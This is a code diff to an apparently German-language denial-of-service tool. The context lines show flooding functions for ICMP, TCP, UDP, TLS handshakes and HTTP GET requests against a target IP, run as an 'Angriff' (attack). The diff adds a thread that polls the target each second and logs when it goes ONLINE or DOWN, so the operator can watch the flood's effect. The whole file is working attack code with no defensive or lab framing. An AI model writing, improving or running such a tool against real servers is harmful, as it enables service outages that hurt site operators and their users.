@@ -7,6 +7,8 @@ import requests
 import time
 from scapy.all import IP, TCP, UDP, ICMP, send
 
+server_status_global = "Unbekannt"
+server_status_global_array = []
 
 def attack_layer3_icmp(target_ip, progress):
     pkt = IP(dst=target_ip) / ICMP()
@@ -69,7 +71,7 @@ def run_attack(layers, target_ip, target_port, progress, start_time, duration):
             attack_layer7_http(target_ip, progress)
 
 
-def display_status(progress, start_time, duration, monitor_layer7):
+def display_status(progress, start_time, duration, monitor_layer7, target_ip):
     prev_layer7 = -1
     while True:
         elapsed = int(time.time() - start_time)
@@ -95,6 +97,9 @@ def display_status(progress, start_time, duration, monitor_layer7):
             else:
                 server_status = "Server: [32mONLINE[0m"
             prev_layer7 = progress['layer7']
+        else:
+            server_status = f"Server: {server_status_global}"
+
 
         output = (
             f"\r[Dauer: {time_str} | Verbleibend: {rem_str}] "
@@ -117,6 +122,33 @@ def print_log(progress, start_time, duration):
     print(f"  Layer 4 (UDP): {progress['layer4_udp']} Pakete")
     print(f"  Layer 6 (TLS Handshake): {progress['layer6']} Verbindungen")
     print(f"  Layer 7 (HTTP GET): {progress['layer7']} Anfragen")
+
+    print("\n\nServer Access:")
+    for i in server_status_global_array:
+        print(f"{i['time']}: {i['status']}")
+
+def check_server_status_periodically(target_ip, stop_event, start_time):
+    global server_status_global
+    global server_status_global_array
+    while not stop_event.is_set():
+        server_status_global_old = server_status_global
+        try:
+            requests.get(f"http://{target_ip}/", timeout=2)
+            server_status_global = "[32mONLINE[0m"
+        except requests.exceptions.RequestException:
+            server_status_global = "[31mDOWN[0m"
+        if server_status_global != server_status_global_old:
+            elapsed = int(time.time() - start_time)
+            hours, remainder = divmod(elapsed, 3600)
+            minutes, seconds = divmod(remainder, 60)
+            time_str = f"{hours:02}:{minutes:02}:{seconds:02}"
+
+            server_status_global_array.append({
+                "status": server_status_global,
+                "time": time_str
+            })
+
+        time.sleep(1)  # prüfe jede Sekunde
 
 
 if __name__ == "__main__":
@@ -150,7 +182,11 @@ if __name__ == "__main__":
             t.daemon = True
             t.start()
 
-        display = threading.Thread(target=display_status, args=(progress, start_time, args.duration, "7" in layers))
+        display = threading.Thread(target=display_status, args=(progress, start_time, args.duration, "7" in layers, args.target))
+        stop_event = threading.Event()
+        server_monitor = threading.Thread(target=check_server_status_periodically, args=(args.target, stop_event, start_time))
+        server_monitor.daemon = True
+        server_monitor.start()
         display.start()
         display.join()
 
@@ -161,3 +197,5 @@ if __name__ == "__main__":
         print("\n[!] KeyboardInterrupt: Angriff abgebrochen durch Benutzer.")
         print_log(progress, start_time, args.duration)
         print("\n[!] Angriff beendet.")
+        stop_event.set()
+        server_monitor.join()
